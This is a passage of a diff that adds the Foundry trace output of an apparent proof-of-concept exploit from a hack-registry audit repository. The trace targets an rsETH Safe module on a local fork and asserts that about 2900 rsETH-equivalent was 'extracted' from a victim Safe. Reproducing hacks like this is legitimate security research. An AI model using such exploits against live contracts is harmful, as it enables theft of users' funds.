+    │   │   ├─ [1878] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [staticcall]
+    │   │   │   ├─ [1326] 0x728a138A4823392C2EFA55e028d434F526fE03CF::getReserveNormalizedIncome(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000033b2e44850b7f2ef9319bf1
+    │   │   └─ ← [Return] 50502655157601776604032 [5.05e22]
+    │   └─ ← [Return] 50502655157601776604032 [5.05e22]
+    ├─ emit log_named_decimal_uint(key: "victim Safe aEthrsETH (after)", val: 50502655157601776604032 [5.05e22], decimals: 18)
+    ├─ [0] VM::assertApproxEqAbs(2899999999999997756821 [2.899e21], 2900000000000000000000 [2.9e21], 1000000000000000000 [1e18], "extracted ~2900 rsETH-equivalent") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.65s (40.74ms CPU time)
+
+Ran 1 test suite in 8.97s (3.65s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/Users/alex/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 22080 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /Users/alex/RustroverProjects/audits/evm-hack-registry/2026-09-RsETHSafeModule_exp)
